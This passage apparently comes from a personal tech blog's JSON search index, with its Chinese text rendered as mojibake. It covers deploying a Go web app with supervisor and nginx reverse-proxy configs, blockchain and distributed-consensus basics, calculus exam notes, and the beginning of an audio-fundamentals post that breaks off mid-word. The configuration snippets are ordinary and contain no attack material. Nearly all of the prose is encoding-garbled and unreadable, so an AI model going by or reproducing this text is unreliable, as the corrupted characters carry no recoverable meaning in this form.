reloadï¼Œè½½å…¥æœ€æ–°çš„é…ç½®æ–‡ä»¶ï¼Œåœæ­¢åŸæœ‰è¿›ç¨‹å¹¶æŒ‰æ–°çš„é…ç½®å¯åŠ¨ã€ç®¡ç†æ‰€æœ‰è¿›ç¨‹ã€‚\n\n  â— supervisorctl updateï¼Œæ ¹æ®æœ€æ–°çš„é…ç½®æ–‡ä»¶ï¼Œå¯åŠ¨æ–°é…ç½®æˆ–æœ‰æ”¹åŠ¨çš„è¿›ç¨‹ï¼Œé…ç½®æ²¡æœ‰æ”¹åŠ¨çš„è¿›ç¨‹ä¸ä¼šå—å½±å“è€Œé‡å¯ã€‚\n\næ³¨æ„ï¼šæ˜¾ç¤ºç”¨ stop åœæ­¢æ‰çš„è¿›ç¨‹ï¼Œç”¨ reload æˆ–è€… update éƒ½ä¸ä¼šè‡ªåŠ¨é‡å¯ã€‚\n\n\n> è‡ªå·±çš„é…ç½®\n\n```\nweb.conf\n\n[program:web]\ndirectory = /home/ubuntu/web\ncommand = /home/ubuntu/web/web\nautostart = true\nstartsecs = 5\nuser = root\nredirect_stderr = true\nstdout_logfile = /var/log/supervisord/web.log\n```\n\nsudo supervisord //å¯åŠ¨\nsudo supervisorctl stop web //ç»“æŸ\n\n\n\n### 3. nginxéƒ¨ç½²\n\n1 å®‰è£…nginx \n\n```\nsudo apt-get install nginx\n```\n\nUbuntuå®‰è£…ä¹‹åçš„æ–‡ä»¶ç»“æ„å¤§è‡´ä¸ºï¼š\n\n  â— æ‰€æœ‰çš„é…ç½®æ–‡ä»¶éƒ½åœ¨/etc/nginxä¸‹ï¼Œå¹¶ä¸”æ¯ä¸ªè™šæ‹Ÿä¸»æœºå·²ç»å®‰æ’åœ¨äº†/etc/nginx/sites-availableä¸‹\n\n  â— ç¨‹åºæ–‡ä»¶åœ¨/usr/sbin/nginx\n\n  â— æ—¥å¿—æ”¾åœ¨äº†/var/log/nginxä¸­\n\n  â— å¹¶å·²ç»åœ¨/etc/init.d/ä¸‹åˆ›å»ºäº†å¯åŠ¨è„šæœ¬nginx\n\n  â— é»˜è®¤çš„è™šæ‹Ÿä¸»æœºçš„ç›®å½•è®¾ç½®åœ¨äº†/var/www/nginx-default (æœ‰çš„ç‰ˆæœ¬ é»˜è®¤çš„è™šæ‹Ÿä¸»æœºçš„ç›®å½•è®¾ç½®åœ¨äº†/var/www, è¯·å‚è€ƒ/etc/nginx/sites-availableé‡Œçš„é…ç½®)\n\n2 å¯åŠ¨nginx\n\n```\nsudo /etc/init.d/nginx start\n```\nç›´æ¥è®¿é—®ip http://54.191.9.26/ å¯ä»¥çœ‹åˆ°nginxå®‰è£…æˆåŠŸ\n\n\n3 å¤„ç†golang\n\nGo æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„ HTTP æœåŠ¡å™¨ï¼Œä½†æ˜¯æˆ‘ä»¬æœ‰äº›æ—¶å€™ä¸ºäº† nginx å¯ä»¥å¸®æˆ‘åšå¾ˆå¤šå·¥ä½œï¼Œä¾‹å¦‚è®¿é—®æ—¥å¿—ï¼Œcc æ”»å‡»ï¼Œé™æ€æœåŠ¡ç­‰ï¼Œnginx å·²ç»åšçš„å¾ˆæˆç†Ÿäº†ï¼ŒGo åªè¦ä¸“æ³¨äºä¸šåŠ¡é€»è¾‘å’ŒåŠŸèƒ½å°±å¥½ï¼Œæ‰€ä»¥é€šè¿‡ nginx é…ç½®ä»£ç†å°±å¯ä»¥å®ç°å¤šåº”ç”¨åŒæ—¶éƒ¨ç½²ï¼Œå¦‚ä¸‹å°±æ˜¯å…¸å‹çš„ä¸¤ä¸ªåº”ç”¨å…±äº« 80 ç«¯å£ï¼Œé€šè¿‡ä¸åŒçš„åŸŸåè®¿é—®ï¼Œåå‘ä»£ç†åˆ°ä¸åŒçš„åº”ç”¨ã€‚\n\n```\nserver {\n    listen       80;\n    server_name  .a.com;\n\n    charset utf-8;\n    access_log  /home/a.com.access.log;\n\n    location /(css|js|fonts|img)/ {\n        access_log off;\n        expires 1d;\n\n        root \"/path/to/app_a/static\";\n        try_files $uri @backend;\n    }\n\n    location / {\n        try_files /_not_exists_ @backend;\n    }\n\n    location @backend {\n        proxy_set_header X-Forwarded-For $remote_addr;\n        proxy_set_header Host            $http_host;\n\n        proxy_pass http://127.0.0.1:8080;\n    }\n}\n\nserver {\n    listen       80;\n    server_name  .b.com;\n\n    charset utf-8;\n    access_log  /home/b.com.access.log  main;\n\n    location /(css|js|fonts|img)/ {\n        access_log off;\n        expires 1d;\n\n        root \"/path/to/app_b/static\";\n        try_files $uri @backend;\n    }\n\n    location / {\n        try_files /_not_exists_ @backend;\n    }\n\n    location @backend {\n        proxy_set_header X-Forwarded-For $remote_addr;\n        proxy_set_header Host            $http_host;\n\n        proxy_pass http://127.0.0.1:8081;\n    }\n}\n```\n\n> è‡ªå·±çš„é…ç½®\n\nsudo vi /etc/nginx/sites-available/default\n\næŠŠ default æ³¨é‡Šæ‰\n\n```\nserver {\n        listen       80;\n        server_name  .xuanyueting.top;\n\n        charset utf-8;\n        access_log  /home/ubuntu/web/xuanyueting.log;\n\n        location /(css|js|fonts|img)/ {\n                access_log off;\n                expires 1d;\n\n                root \"/home/ubuntu/web/static\";\n                try_files $uri @backend;\n        }\n        location / {\n                try_files /_not_exists_ @backend;\n        }\n\n        location @backend {\n                proxy_set_header x-forwarded-for $remote_addr;\n                proxy_set_header host            $http_host;\n\n                proxy_pass http://127.0.0.1:8080;\n        }\n}\n```\n\n\n","tags":["golang"],"categories":["golang"]},{"title":"åŒºå—é“¾åŸºç¡€","url":"%2Fp%2Feb2c6f22.html","content":"\n# åŒºå—é“¾\n\nåŒºå—é“¾å±äºä¸€ç§å»ä¸­å¿ƒåŒ–çš„è®°å½•æŠ€æœ¯ã€‚å‚ä¸åˆ°ç³»ç»Ÿä¸Šçš„èŠ‚ç‚¹ï¼Œå¯èƒ½ä¸å±äºåŒä¸€ç»„ç»‡ã€å½¼æ­¤æ— éœ€ä¿¡ä»»ï¼›åŒºå—é“¾æ•°æ®ç”±æ‰€æœ‰èŠ‚ç‚¹å…±åŒç»´æŠ¤ï¼Œæ¯ä¸ªå‚ä¸ç»´æŠ¤èŠ‚ç‚¹éƒ½èƒ½å¤åˆ¶è·å¾—ä¸€ä»½å®Œæ•´è®°å½•çš„æ‹·è´ã€‚\n\n### ç‰¹ç‚¹\nè·Ÿä¼ ç»Ÿçš„è®°è´¦æŠ€æœ¯ç›¸æ¯”ï¼Œå…¶ç‰¹ç‚¹åº”è¯¥åŒ…æ‹¬ï¼š\n\n* ç»´æŠ¤ä¸€æ¡ä¸æ–­å¢é•¿çš„é“¾ï¼Œåªå¯èƒ½æ·»åŠ è®°å½•ï¼Œè€Œå‘ç”Ÿè¿‡çš„è®°å½•éƒ½ä¸å¯ç¯¡æ”¹ï¼›\n* å»ä¸­å¿ƒåŒ–ï¼Œæˆ–è€…è¯´å¤šä¸­å¿ƒåŒ–ï¼Œæ— éœ€é›†ä¸­çš„æ§åˆ¶è€Œèƒ½è¾¾æˆå…±è¯†ï¼Œå®ç°ä¸Šå°½é‡åˆ†å¸ƒå¼ï¼›\n* é€šè¿‡å¯†ç å­¦çš„æœºåˆ¶æ¥ç¡®ä¿äº¤æ˜“æ— æ³•æŠµèµ–å’Œç ´åï¼Œå¹¶å°½é‡ä¿æŠ¤ç”¨æˆ·ä¿¡æ¯å’Œè®°å½•çš„éšç§æ€§ã€‚\n\n\n### åŸºæœ¬åŸç†\nåŒºå—é“¾çš„åŸºæœ¬åŸç†ç†è§£èµ·æ¥å¹¶ä¸éš¾ã€‚åŸºæœ¬æ¦‚å¿µåŒ…æ‹¬ï¼š\n\n* äº¤æ˜“ï¼ˆTransactionï¼‰ï¼šä¸€æ¬¡æ“ä½œï¼Œå¯¼è‡´è´¦æœ¬çŠ¶æ€çš„ä¸€æ¬¡æ”¹å˜ï¼Œå¦‚æ·»åŠ ä¸€æ¡è®°å½•ï¼›\n* åŒºå—ï¼ˆBlockï¼‰ï¼šè®°å½•ä¸€æ®µæ—¶é—´å†…å‘ç”Ÿçš„äº¤æ˜“å’ŒçŠ¶æ€ç»“æœï¼Œæ˜¯å¯¹å½“å‰è´¦æœ¬çŠ¶æ€çš„ä¸€æ¬¡å…±è¯†ï¼›\n* é“¾ï¼ˆChainï¼‰ï¼šç”±ä¸€ä¸ªä¸ªåŒºå—æŒ‰ç…§å‘ç”Ÿé¡ºåºä¸²è”è€Œæˆï¼Œæ˜¯æ•´ä¸ªçŠ¶æ€å˜åŒ–çš„æ—¥å¿—è®°å½•ã€‚\n<!-- more -->\n\n### åˆ†ç±»\næ ¹æ®å‚ä¸è€…çš„ä¸åŒï¼Œå¯ä»¥åˆ†ä¸ºå…¬å¼€ï¼ˆPublicï¼‰é“¾ã€è”ç›Ÿï¼ˆConsortiumï¼‰é“¾å’Œç§æœ‰ï¼ˆPrivateï¼‰é“¾ã€‚\nç›®å‰æ¥çœ‹ï¼Œå…¬å¼€é“¾å°†ä¼šæ›´å¤šçš„å¸å¼•ç¤¾åŒºå’Œåª’ä½“çš„çœ¼çƒï¼Œä½†æ›´å¤šçš„å•†ä¸šä»·å€¼åº”è¯¥åœ¨è”ç›Ÿé“¾å’Œç§æœ‰é“¾ä¸Šã€‚\n\næ ¹æ®ä½¿ç”¨ç›®çš„å’Œåœºæ™¯çš„ä¸åŒï¼Œåˆå¯ä»¥åˆ†ä¸ºä»¥æ•°å­—è´§å¸ä¸ºç›®çš„çš„è´§å¸é“¾ï¼Œä»¥è®°å½•äº§æƒä¸ºç›®çš„çš„äº§æƒé“¾ï¼Œä»¥ä¼—ç­¹ä¸ºç›®çš„çš„ä¼—ç­¹é“¾ç­‰ã€‚\n\n### å­˜å‚¨\né¦–å…ˆï¼ŒåŒºå—é“¾ä¸æ˜¯æ•°æ®åº“ã€‚è™½ç„¶åŒºå—é“¾ä¹Ÿå¯ä»¥ç”¨æ¥å­˜å‚¨æ•°æ®ï¼Œä½†å®ƒè¦è§£å†³çš„é—®é¢˜æ˜¯å¤šæ–¹çš„äº’ä¿¡é—®é¢˜ã€‚å•çº¯ä»å­˜å‚¨æ•°æ®è§’åº¦ï¼Œå®ƒçš„æ•ˆç‡å¯èƒ½ä¸é«˜ï¼Œç¬”è€…ä¹Ÿä¸æ¨èæŠŠå¤§é‡çš„åŸå§‹æ•°æ®æ”¾åˆ°åŒºå—é“¾ä¸Šã€‚\n\n### è®¡ç®—\nåŒºå—é“¾æŠ€æœ¯è¿˜èƒ½å¸¦æ¥æ›´é€šç”¨çš„è®¡ç®—èƒ½åŠ›ã€‚Hyperledger å’Œ Ethereum å°±è¯•å›¾åšç±»ä¼¼çš„äº‹æƒ…ï¼ŒåŸºäºåŒºå—é“¾å†åšä¸€å±‚å¹³å°å±‚ï¼Œè®©åˆ«äººåŸºäºå¹³å°å¼€å‘åº”ç”¨å˜å¾—æ›´ç®€å•ã€‚\n\n\n\n\n# åˆ†å¸ƒå¼é—®é¢˜\n\n### ä¸€è‡´æ€§\n\nç†æƒ³çš„åˆ†å¸ƒå¼ç³»ç»Ÿä¸€è‡´æ€§åº”è¯¥æ»¡è¶³ï¼š\n\n* å¯ç»ˆæ­¢æ€§ï¼ˆTerminationï¼‰ï¼šä¸€è‡´çš„ç»“æœåœ¨æœ‰é™æ—¶é—´å†…èƒ½å®Œæˆï¼›\n* å…±è¯†æ€§ï¼ˆConsensusï¼‰ï¼šä¸åŒèŠ‚ç‚¹æœ€ç»ˆå®Œæˆå†³ç­–çš„ç»“æœåº”è¯¥ç›¸åŒï¼›\n* åˆæ³•æ€§ï¼ˆValidityï¼‰ï¼šå†³ç­–çš„ç»“æœå¿…é¡»æ˜¯å…¶å®ƒè¿›ç¨‹æå‡ºçš„ææ¡ˆã€‚\n\n\nå®é™…ä¸Šï¼Œè¶Šå¼ºçš„ä¸€è‡´æ€§è¦æ±‚å¾€å¾€æ„å‘³ç€è¶Šå¼±çš„æ€§èƒ½ã€‚\n\n\n### FLP ä¸å¯èƒ½æ€§åŸç†\n\nFLP ä¸å¯èƒ½åŸç†ï¼šåœ¨ç½‘ç»œå¯é ï¼Œå­˜åœ¨èŠ‚ç‚¹å¤±æ•ˆï¼ˆå³ä¾¿åªæœ‰ä¸€ä¸ªï¼‰çš„æœ€å°åŒ–å¼‚æ­¥æ¨¡å‹ç³»ç»Ÿä¸­ï¼Œä¸å­˜åœ¨ä¸€ä¸ªå¯ä»¥è§£å†³ä¸€è‡´æ€§é—®é¢˜çš„ç¡®å®šæ€§ç®—æ³•ã€‚\n\nFLP ä¸å¯èƒ½åŸç†å®é™…ä¸Šå‘Šè¯‰äººä»¬ï¼Œä¸è¦æµªè´¹æ—¶é—´å»ä¸ºå¼‚æ­¥åˆ†å¸ƒå¼ç³»ç»Ÿè®¾è®¡åœ¨ä»»æ„åœºæ™¯ä¸‹éƒ½èƒ½å®ç°å…±è¯†çš„ç®—æ³•ã€‚\n\n\n### CAP åŸç†\n\n* ä¸€è‡´æ€§ï¼ˆConsistencyï¼‰ï¼šä»»ä½•æ“ä½œåº”è¯¥éƒ½æ˜¯åŸå­çš„ï¼Œå‘ç”Ÿåœ¨åé¢çš„äº‹ä»¶èƒ½çœ‹åˆ°å‰é¢äº‹ä»¶å‘ç”Ÿå¯¼è‡´çš„ç»“æœï¼Œæ³¨æ„è¿™é‡ŒæŒ‡çš„æ˜¯å¼ºä¸€è‡´æ€§ï¼›\n* å¯ç”¨æ€§ï¼ˆAvailablityï¼‰ï¼šåœ¨æœ‰é™æ—¶é—´å†…ï¼Œä»»ä½•éå¤±è´¥èŠ‚ç‚¹éƒ½èƒ½åº”ç­”è¯·æ±‚ï¼›\n* åˆ†åŒºå®¹å¿æ€§ï¼ˆPartitionï¼‰ï¼šç½‘ç»œå¯èƒ½å‘ç”Ÿåˆ†åŒºï¼Œå³èŠ‚ç‚¹ä¹‹é—´çš„é€šä¿¡ä¸å¯ä¿éšœã€‚\n\n1. å¼±åŒ–ä¸€è‡´æ€§  å¯¹ç»“æœä¸€è‡´æ€§ä¸æ•æ„Ÿçš„åº”ç”¨ï¼Œå¯ä»¥å…è®¸åœ¨æ–°ç‰ˆæœ¬ä¸Šçº¿åè¿‡ä¸€æ®µæ—¶é—´æ‰æ›´æ–°æˆåŠŸï¼ŒæœŸé—´ä¸ä¿è¯ä¸€è‡´æ€§ã€‚\n\n2. å¼±åŒ–å¯ç”¨æ€§  å¯¹ç»“æœä¸€è‡´æ€§å¾ˆæ•æ„Ÿçš„åº”ç”¨ï¼Œä¾‹å¦‚é“¶è¡Œå–æ¬¾æœºï¼Œå½“ç³»ç»Ÿæ•…éšœæ—¶å€™ä¼šæ‹’ç»æœåŠ¡ã€‚MongoDBã€Redis ç­‰ä¸ºæ­¤è®¾è®¡ã€‚Paxosã€Raft ç­‰ç®—æ³•ï¼Œä¸»è¦å¤„ç†è¿™ç§æƒ…å†µã€‚\n\n3. å¼±åŒ–åˆ†åŒºå®¹å¿æ€§  ç°å®ä¸­ï¼Œç½‘ç»œåˆ†åŒºå‡ºç°æ¦‚ç‡å‡å°ï¼Œä½†è¾ƒéš¾é¿å…ã€‚æŸäº›å…³ç³»å‹æ•°æ®åº“ã€ZooKeeper å³ä¸ºæ­¤è®¾è®¡ã€‚\n\n\n### ACID åŸåˆ™\n\n\nå³ Atomicityï¼ˆåŸå­æ€§ï¼‰ã€Consistencyï¼ˆä¸€è‡´æ€§ï¼‰ã€Isolationï¼ˆéš”ç¦»æ€§ï¼‰ã€Durabilityï¼ˆæŒä¹…æ€§ï¼‰ã€‚\n\nACID åŸåˆ™æè¿°äº†å¯¹åˆ†å¸ƒå¼æ•°æ®åº“çš„ä¸€è‡´æ€§éœ€æ±‚ï¼ŒåŒæ—¶ä»˜å‡ºäº†å¯ç”¨æ€§çš„ä»£ä»·ã€‚\n\n* Atomicityï¼šæ¯æ¬¡æ“ä½œæ˜¯åŸå­çš„ï¼Œè¦ä¹ˆæˆåŠŸï¼Œè¦ä¹ˆä¸æ‰§è¡Œï¼›\n* Consistencyï¼šæ•°æ®åº“çš„çŠ¶æ€æ˜¯ä¸€è‡´çš„ï¼Œæ— ä¸­é—´çŠ¶æ€ï¼›\n* Isolationï¼šå„ç§æ“ä½œå½¼æ­¤äº’ç›¸ä¸å½±å“ï¼›\n* Durabilityï¼šçŠ¶æ€çš„æ”¹å˜æ˜¯æŒä¹…çš„ï¼Œä¸ä¼šå¤±æ•ˆã€‚\n\nä¸€ä¸ªä¸ä¹‹ç›¸å¯¹çš„åŸåˆ™æ˜¯ BASEï¼ˆBasic Availiabilityï¼ŒSoft stateï¼ŒEventually Consistencyï¼‰ï¼Œç‰ºç‰²æ‰å¯¹ä¸€è‡´æ€§çš„çº¦æŸï¼ˆæœ€ç»ˆä¸€è‡´æ€§ï¼‰ï¼Œæ¥æ¢å–ä¸€å®šçš„å¯ç”¨æ€§ã€‚\n\n\n# å¯†ç å­¦\n\n\n### hash\n\nä¸€ä¸ªä¼˜ç§€çš„ hash ç®—æ³•ï¼Œå°†èƒ½å®ç°ï¼š\n\n* æ­£å‘å¿«é€Ÿï¼šç»™å®šæ˜æ–‡å’Œ hash ç®—æ³•ï¼Œåœ¨æœ‰é™æ—¶é—´å’Œæœ‰é™èµ„æºå†…èƒ½è®¡ç®—å‡º hash å€¼ã€‚\n* é€†å‘å›°éš¾ï¼šç»™å®šï¼ˆè‹¥å¹²ï¼‰ hash å€¼ï¼Œåœ¨æœ‰é™æ—¶é—´å†…å¾ˆéš¾ï¼ˆåŸºæœ¬ä¸å¯èƒ½ï¼‰é€†æ¨å‡ºæ˜æ–‡ã€‚\n* è¾“å…¥æ•æ„Ÿï¼šåŸå§‹è¾“å…¥ä¿¡æ¯ä¿®æ”¹ä¸€ç‚¹ä¿¡æ¯ï¼Œäº§ç”Ÿçš„ hash å€¼çœ‹èµ·æ¥åº”è¯¥éƒ½æœ‰å¾ˆå¤§ä¸åŒã€‚\n* å†²çªé¿å…ï¼šå¾ˆéš¾æ‰¾åˆ°ä¸¤æ®µå†…å®¹ä¸åŒçš„æ˜æ–‡ï¼Œä½¿å¾—å®ƒä»¬çš„ hash å€¼ä¸€è‡´ï¼ˆå‘ç”Ÿå†²çªï¼‰\n\n\n\n### åŠ è§£å¯†\n\næ ¹æ®åŠ è§£å¯†çš„å¯†é’¥æ˜¯å¦ç›¸åŒï¼Œç®—æ³•å¯ä»¥åˆ†ä¸ºå¯¹ç§°åŠ å¯†ï¼ˆsymmetric cryptographyï¼Œåˆç§°å…¬å…±å¯†é’¥åŠ å¯†ï¼Œcommon-key cryptographyï¼‰å’Œéå¯¹ç§°åŠ å¯†(asymmetric cryptographyï¼Œåˆç§°å…¬é’¥åŠ å¯†ï¼Œpublic-key cryptography)ã€‚ä¸¤ç§æ¨¡å¼é€‚ç”¨äºä¸åŒçš„éœ€æ±‚ï¼Œæ°å¥½å½¢æˆäº’è¡¥ï¼Œå¾ˆå¤šæ—¶å€™ä¹Ÿå¯ä»¥ç»„åˆä½¿ç”¨ï¼Œå½¢æˆæ··åˆåŠ å¯†æœºåˆ¶ã€‚\n\n\n* å¯¹ç§°åŠ å¯†\n\nä¼˜ç‚¹æ˜¯åŠ è§£å¯†æ•ˆç‡é«˜ï¼ˆé€Ÿåº¦å¿«ï¼Œç©ºé—´å ç”¨å°ï¼‰ï¼ŒåŠ å¯†å¼ºåº¦é«˜ã€‚\n\nç¼ºç‚¹æ˜¯å‚ä¸å¤šæ–¹éƒ½éœ€è¦æŒæœ‰å¯†é’¥ï¼Œä¸€æ—¦æœ‰äººæ³„éœ²åˆ™å®‰å…¨æ€§è¢«ç ´åï¼›å¦å¤–å¦‚ä½•åœ¨ä¸å®‰å…¨é€šé“ä¸‹åˆ†å‘å¯†é’¥ä¹Ÿæ˜¯ä¸ªé—®é¢˜ã€‚\n\né€‚ç”¨äºå¤§é‡æ•°æ®çš„åŠ è§£å¯†ï¼›ä¸èƒ½ç”¨äºç­¾ååœºæ™¯ï¼›éœ€è¦æå‰åˆ†å‘å¯†é’¥ã€‚\n\n* éå¯¹ç§°åŠ å¯†\n\néå¯¹ç§°åŠ å¯†æ˜¯ç°ä»£å¯†ç å­¦å†å²ä¸Šæœ€ä¸ºä¼Ÿå¤§çš„å‘æ˜ï¼Œå¯ä»¥å¾ˆå¥½çš„è§£å†³å¯¹ç§°åŠ å¯†éœ€è¦çš„æå‰åˆ†å‘å¯†é’¥é—®é¢˜ã€‚\n\né¡¾åæ€ä¹‰ï¼ŒåŠ å¯†å¯†é’¥å’Œè§£å¯†å¯†é’¥æ˜¯ä¸åŒçš„ï¼Œåˆ†åˆ«ç§°ä¸ºå…¬é’¥å’Œç§é’¥ã€‚\nå…¬é’¥ä¸€èˆ¬æ˜¯å…¬å¼€çš„ï¼Œäººäººå¯è·å–çš„ï¼Œç§é’¥ä¸€èˆ¬æ˜¯ä¸ªäººè‡ªå·±æŒæœ‰ï¼Œä¸èƒ½è¢«ä»–äººè·å–ã€‚\nä¼˜ç‚¹æ˜¯å…¬ç§é’¥åˆ†å¼€ï¼Œä¸å®‰å…¨é€šé“ä¹Ÿå¯ä½¿ç”¨ã€‚\nç¼ºç‚¹æ˜¯åŠ è§£å¯†é€Ÿåº¦æ…¢ï¼Œä¸€èˆ¬æ¯”å¯¹ç§°åŠ è§£å¯†ç®—æ³•æ…¢ä¸¤åˆ°ä¸‰ä¸ªæ•°é‡çº§ï¼›åŒæ—¶åŠ å¯†å¼ºåº¦ç›¸æ¯”å¯¹ç§°åŠ å¯†è¦å·®ã€‚\n\nä¸€èˆ¬é€‚ç”¨äºç­¾ååœºæ™¯æˆ–å¯†é’¥åå•†ï¼Œä¸é€‚äºå¤§é‡æ•°æ®çš„åŠ è§£å¯†ã€‚\n\n* æ··åˆåŠ å¯†æœºåˆ¶\n\nå³å…ˆç”¨è®¡ç®—å¤æ‚åº¦é«˜çš„éå¯¹ç§°åŠ å¯†åå•†ä¸€ä¸ªä¸´æ—¶çš„å¯¹ç§°åŠ å¯†å¯†é’¥ï¼ˆä¼šè¯å¯†é’¥ï¼Œä¸€èˆ¬ç›¸å¯¹å†…å®¹æ¥è¯´è¦çŸ­çš„å¤šï¼‰ï¼Œç„¶ååŒæ–¹å†é€šè¿‡å¯¹ç§°åŠ å¯†å¯¹ä¼ é€’çš„å¤§é‡æ•°æ®è¿›è¡ŒåŠ è§£å¯†å¤„ç†ã€‚\n\nå…¸å‹çš„åœºæ™¯æ˜¯ç°åœ¨å¤§å®¶å¸¸ç”¨çš„ HTTPS æœºåˆ¶ã€‚\n\n\n\n","tags":["åŒºå—é“¾"],"categories":["è®¡ç®—æœºåŸºç¡€"]},{"title":"è€ƒç ”é«˜æ•°äºŒ","url":"%2Fp%2Fa2d3bfae.html","content":"\nåšé¢˜, ä¸åˆ·è§†é¢‘!!!!!!!!! ä¸ä¼šå†æ‰¾è§†é¢‘çœ‹\n\n<!-- more -->\n\n# 1. åŸºç¡€\n\n### 1.1 ä¸‰è§’å‡½æ•°\n\nsin    1 2 3              2ä¸ºåº•\n\ncos   3 2 1             2ä¸ºåº•\n\ntan    3 9 27          3ä¸ºåº•\n\n### 1.2 å¯¹æ•°\n\nå…¶å®æ˜¯æ±‚æŒ‡æ•°çš„\n\n+ çœŸæ•°å¦‚æœæœ‰æ¬¡æ•°, ç›´æ¥æå‰ loga(B^2) = 2 logaB\n+ æ¢åº•å…¬å¼, logaB   = lgB/lga\n\n### 1.3 å¯¼æ•°\n\n![1](è€ƒç ”é«˜æ•°äºŒ/å¯¼æ•°1.jpg)\n\n##### 1.3.1 å¯¼æ•°è¿ç®—\n\n+ ç›¸åŠ ç›¸å‡, å°±æ˜¯æ±‚å¯¼åä¾æ¬¡ç›¸åŠ ,ç›¸å‡\n+ ç›¸ä¹˜  å·¦å¯¼å³ä¸å¯¼ + å³å¯¼å·¦ä¸å¯¼\n+ ç›¸é™¤  (å·¦å¯¼å³ä¸å¯¼ - å³å¯¼å·¦ä¸å¯¼) / (å³)^2\n\n##### 1.3.2 å¤åˆå‡½æ•°æ±‚å¯¼\n\n+ é“¾å¼æ³•åˆ™, å…ˆæŠŠé‡Œé¢çš„å½“æˆä¸€ä¸ªæœªçŸ¥æ•°æ¥çœ‹, å…ˆæ±‚å¤–é¢çš„å¯¼, å†ä¹˜ä»¥é‡Œé¢æœªçŸ¥æ•°çš„æ±‚å¯¼\n+ æœ€åå†æŠŠæœªçŸ¥æ•°ç»™å¸¦å›å»\n\n![1](è€ƒç ”é«˜æ•°äºŒ/å¯¼æ•°2.png)\n\n##### 1.3.3 æ´›å¿…è¾¾æ³•åˆ™\n\n+ æ˜¯å¯¹0/0, æ­£æ— ç©·/æ­£æ— ç©· çš„å€¼çš„æ—¶å€™, ä¸Šä¸‹éƒ½æ±‚å¯¼\n+ å¦‚æœå¯¼ä¸€æ¬¡åˆ†æ¯è¿˜æ˜¯0, å°±ä¸€ç›´å¯¼ä¸‹å», ç±»ä¼¼æ´›ç¥\n+ å¯èƒ½æ— æ³•åŒ–ç®€, æˆ–è€…æ´›å¿…è¾¾ä¹‹åæé™ä¸å­˜åœ¨, è¯´æ˜æ´›å¿…è¾¾å¤±æ•ˆ, è€Œä¸æ˜¯åŸå‡½æ•°æ²¡æœ‰æé™\n\n\n\n# 2. é«˜æ•°\n\n### 2.1 æ— ç©·å°é‡\n\nè¶‹å‘äº0çš„åŠ¨æ€å˜é‡, æ¯”è¾ƒ: éƒ½æ˜¯æ— ç©·å°, è°å¿«è°é«˜é˜¶\n\n+ é«˜é˜¶: 0/k = 0 å…ˆåˆ°è¾¾æ°´æ™¶\n\n+ ä½é˜¶ k/0 = æ­£æ— ç©·\n\n+ åŒé˜¶,  k(k!=1)  èƒ½é‡å¤§å°å·®ä¸å¤šæ•° \n+ ç›¸ç­‰, 1\n\n##### 2.1.1 å¸¸ç”¨ç­‰ä»·æ— ç©·å°é‡ æ³¢æµªçº¿~\n\n![1](è€ƒç ”é«˜æ•°äºŒ/ç­‰ä»·æ— ç©·å°1.jpg)\n\n##### 2.1.2 æ±‚æ— ç©·å°é‡çš„é˜¶æ•°\n\n\n\n### 2.2 å¾®åˆ†\n\n+ dF(x) æ˜¯ F(x)çš„å¾®åˆ†\n\n### 2.3 ç§¯åˆ†\n\n+ å®šç§¯åˆ†  Sa,b   f(x) dx\n\n+ ä¸å®šç§¯åˆ† F(x) = S f(x) dx\n\n  \n\n### 2.5 æé™\n\nx->0+   x ä»å³ä¾§è¶‹è¿‘äº0\n\nx->0-   x ä»å·¦ä¾§è¶‹è¿‘äº0\n\n\n\n### 2.6 é—´æ–­ç‚¹\n\n+ ç¬¬ä¸€ç±»é—´æ–­ç‚¹\n\n  + å¯å»é—´æ–­ç‚¹   å·¦å³æé™å­˜åœ¨ä¸”ç›¸ç­‰, ä½†æ˜¯ä¸­é—´æ²¡æœ‰å€¼\n  + è·³è·ƒé—´æ–­ç‚¹  å·¦å³æé™å­˜åœ¨ä¸ç›¸ç­‰\n\n+ ç¬¬äºŒç±»é—´æ–­ç‚¹\n\n  æœ‰ä¸€ä¸ªæé™ä¸å­˜åœ¨\n\n+ æ€»ç»“\n  + å…ˆçœ‹å®šä¹‰åŸŸ, å†çœ‹æé™\n\n\n\n#### 2.7 æ‹ç‚¹\n\n+ ä¸¤æ¬¡å¯¼, ç­‰äºçš„0çš„ç‚¹\n+ `>0` å‡¹åŒºé—´\n+ `<0` å‡¸åŒºé—´\n\n#### 2.8 é©»ç‚¹\n\nä¸€æ¬¡å¯¼=0çš„ç‚¹\n\n### 2.6 æ³°å‹’å…¬å¼\n\n","tags":["æ•°å­¦"],"categories":["æ•°å­¦"]},{"title":"éŸ³é¢‘åŸºç¡€","url":"%2Fp%2F279c3cd4.html","content":"\n\n### éŸ³é¢‘åŸºç¡€\n\nå½“å‰ï¼Œæˆ‘ä»¬æ‰€è¯´çš„éŸ³é¢‘ï¼Œéƒ½æ˜¯æ•°å­—éŸ³é¢‘ã€‚æ•°å­—éŸ³é¢‘ç”±é‡‡æ ·é¢‘ç‡ã€é‡‡æ ·ç²¾åº¦ã€å£°éŸ³é€šé“æ•°ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆã€‚\n\né‡‡æ ·é¢‘ç‡ï¼šæ—¢é‡‡æ ·ç‡ï¼ŒæŒ‡è®°å½•å£°éŸ³æ—¶æ¯ç§’çš„é‡‡æ ·ä¸ªæ•°ï¼Œå®ƒç”¨èµ«å…¹(Hz)æ¥è¡¨ç¤ºã€‚\né‡‡æ ·ç²¾åº¦ï¼šæŒ‡è®°å½•å£°éŸ³çš„åŠ¨æ€èŒƒå›´ï¼Œå®ƒä»¥ä½(Bit)ä¸ºå•ä½ã€‚\nå£°éŸ³é€šé“ï¼šæ—¢å£°é“æ•°ï¼ˆ1-8ä¸ªï¼‰ã€‚\n\né‡‡æ ·ç‡æ ¹æ®ä½¿ç”¨ç±»å‹ä¸åŒå¤§æ¦‚æœ‰ä»¥ä¸‹å‡ ç§ï¼ˆkæ—¢åƒä½ç¬¦å·ï¼Œ1khz=1000hzï¼‰ï¼š\n8khzï¼šç”µè¯ç­‰ä½¿ç”¨ï¼Œå¯¹äºè®°å½•äººå£°å·²ç»è¶³å¤Ÿä½¿ç”¨ã€‚\n22.05khzï¼šå¹¿æ’­ä½¿ç”¨é¢‘ç‡ã€‚\n44.1kbï¼šéŸ³é¢‘CDã€‚\n48khzï¼šDVDã€æ•°å­—ç”µè§†ä¸­ä½¿ç”¨ã€‚\n96khz-192khzï¼šDVD-Audioã€è“å…‰é«˜æ¸…ç­‰ä½¿ç”¨ã€‚\n\né‡‡æ 